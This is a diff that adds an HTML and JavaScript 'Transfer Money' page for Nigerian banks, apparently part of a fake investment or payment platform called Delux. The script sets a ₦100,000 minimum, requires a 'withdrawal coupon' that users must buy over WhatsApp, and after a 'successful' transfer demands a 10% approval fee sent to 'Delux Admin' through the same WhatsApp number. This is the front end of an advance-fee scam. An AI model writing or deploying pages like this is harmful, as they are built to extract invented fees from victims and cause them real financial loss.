@@ -1,0 +1,183 @@
+<!DOCTYPE html>  
+<html lang="en">      
+<head>      
+    <meta charset="UTF-8">      
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">      
+    <title>Transfer Money</title>      
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>      
+    <style>      
+        body {      
+            font-family: Arial, sans-serif;      
+            background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQega-yazR6qNgsC9z-JRcdJn9Gja8vLtJd4A&s') no-repeat center center fixed;      
+            background-size: cover;      
+            text-align: center;      
+            padding: 20px;      
+            color: white;      
+        }      
+        .container {      
+            background: rgba(255, 255, 255, 0.15);      
+            backdrop-filter: blur(10px);      
+            padding: 25px;      
+            width: 90%;      
+            max-width: 400px;      
+            margin: auto;      
+            border-radius: 15px;      
+            box-shadow: 0px 5px 20px rgba(0, 0, 0, 0.3);      
+        }      
+        input, select, button {      
+            width: 100%;      
+            padding: 12px;      
+            margin: 10px 0;      
+            border-radius: 8px;      
+            border: none;      
+            font-size: 16px;      
+        }      
+        input, select {      
+            background: rgba(255, 255, 255, 0.8);      
+            color: black;      
+        }      
+        button {      
+            background-color: green;      
+            color: white;      
+            font-weight: bold;      
+            cursor: pointer;      
+            border: none;      
+            transition: 0.3s;      
+        }      
+        button:hover {      
+            background-color: darkgreen;      
+        }      
+        .error {      
+            color: red;      
+            font-size: 14px;      
+            margin-top: 5px;      
+        }      
+        .deposit-btn, .buy-coupon-btn {      
+            background: red;      
+            color: white;      
+            font-size: 14px;      
+            padding: 10px;      
+            border-radius: 5px;      
+            margin-top: 10px;      
+            cursor: pointer;      
+            text-decoration: none;      
+            display: inline-block;      
+        }      
+        .deposit-btn:hover, .buy-coupon-btn:hover {      
+            background: darkred;      
+        }      
+        .approve-btn {      
+            background: blue;      
+            color: white;      
+            font-size: 14px;      
+            padding: 10px;      
+            border-radius: 5px;      
+            margin-top: 10px;      
+            cursor: pointer;      
+            text-decoration: none;      
+            display: none;      
+        }      
+        .approve-btn:hover {      
+            background: darkblue;      
+        }      
+    </style>      
+</head>      
+<body>      
+    <div class="container">      
+        <h2>Transfer Money</h2>      
+        <input type="text" id="receiverName" placeholder="Receiver's Name">      
+        <input type="text" id="receiverAccount" placeholder="Receiver's Account Number">      
+        <select id="bank">      
+            <option value="">Select Bank</option>      
+            <option value="Access Bank">💳 Access Bank</option>      
+            <option value="Citibank">🏦 Citibank</option>      
+            <option value="Ecobank">🏛️ Ecobank</option>      
+            <option value="Fidelity Bank">💰 Fidelity Bank</option>      
+            <option value="First Bank">🏦 First Bank</option>      
+            <option value="FCMB">🏦 FCMB</option>      
+            <option value="GTBank">🏦 GTBank</option>      
+            <option value="Kuda Bank">📱 Kuda Bank</option>      
+            <option value="Opay">📲 Opay</option>      
+            <option value="Palmpay">📲 Palmpay</option>      
+            <option value="Moniepoint">📱 Moniepoint</option>      
+            <option value="UBA">🏦 UBA</option>      
+            <option value="Union Bank">🏦 Union Bank</option>      
+            <option value="Zenith Bank">🏦 Zenith Bank</option>      
+        </select>      
+        <input type="number" id="amount" placeholder="Amount (₦)">      
+        <input type="text" id="coupon" placeholder="Enter Withdrawal Coupon" style="display: none;">      
+        <button onclick="sendMoney()">Send Money</button>      
+          
+        <p id="errorMessage" class="error"></p>      
+        <p id="successMessage" style="color: white;"></p>      
+        <a id="approveButton" class="approve-btn" href="#">Approve Payment</a>      
+    </div>      
+  
+    <script>      
+        function sendMoney() {      
+            const receiverName = document.getElementById("receiverName").value.trim();      
+            const receiverAccount = document.getElementById("receiverAccount").value.trim();      
+            const bank = document.getElementById("bank").value;      
+            const amount = parseFloat(document.getElementById("amount").value);      
+            const couponField = document.getElementById("coupon");      
+            const coupon = couponField.value.trim();  
+  
+            document.getElementById("errorMessage").innerHTML = "";      
+            document.getElementById("successMessage").innerText = "";      
+            document.getElementById("approveButton").style.display = "none";  
+  
+            if (!receiverName || !receiverAccount || !bank || !amount) {      
+                document.getElementById("errorMessage").innerText = "All fields are required (excluding coupon for now).";      
+                return;      
+            }      
+  
+            if (amount < 100000) {      
+                document.getElementById("errorMessage").innerText = "Minimum transfer amount is ₦100,000 for first-time users.";      
+                return;      
+            }      
+  
+            fetch("/balance")      
+            .then(response => response.json())      
+            .then(data => {      
+                if (amount > data.balance) {      
+                    document.getElementById("errorMessage").innerHTML = `      
+                        <p>Insufficient funds! Kindly deposit to your account.</p>      
+                        <a href="add.html" class="deposit-btn">Deposit Now</a>      
+                    `;      
+                } else {      
+                    // Show coupon field after successful balance check      
+                    if (couponField.style.display === "none") {      
+                        couponField.style.display = "block";      
+                        document.getElementById("errorMessage").innerText = "Please enter your withdrawal coupon.";      
+                        return;      
+                    }      
+                    if (coupon !== "DLX338989") {      
+                        document.getElementById("errorMessage").innerHTML = `      
+                            <p>Incorrect coupon! Please buy a valid coupon.</p>      
+                            <a href="https://wa.me/+12568212395?text=${encodeURIComponent('Hello, I need to buy a withdrawal coupon.')}" class="buy-coupon-btn">Buy Coupon</a>      
+                        `;      
+                        return;      
+                    }      
+  
+                    fetch("/transfer", {      
+                        method: "POST",      
+                        headers: { "Content-Type": "application/json" },      
+                        body: JSON.stringify({ receiverName, receiverAccount, bank, amount })      
+                    })      
+                    .then(response => response.json())      
+                    .then(data => {      
+                        document.getElementById("successMessage").innerHTML = `      
+                            Transfer successful! You need to pay 10% (₦10,000) to Delux Admin for approval.      
+                        `;      
+                        const whatsappMessage = `I just transfer ${amount} from delux please send an account to pay my 10,000 and approve my payment`;      
+                        document.getElementById("approveButton").href = `https://wa.me/+12568212395?text=${encodeURIComponent(whatsappMessage)}`;      
+                        document.getElementById("approveButton").style.display = "inline-block";      
+                    })      
+                    .catch(error => console.error("Error:", error));      
+                }      
+            })      
+            .catch(error => console.error("Error fetching balance:", error));      
+        }      
+    </script>  
+</body>      
+</html>
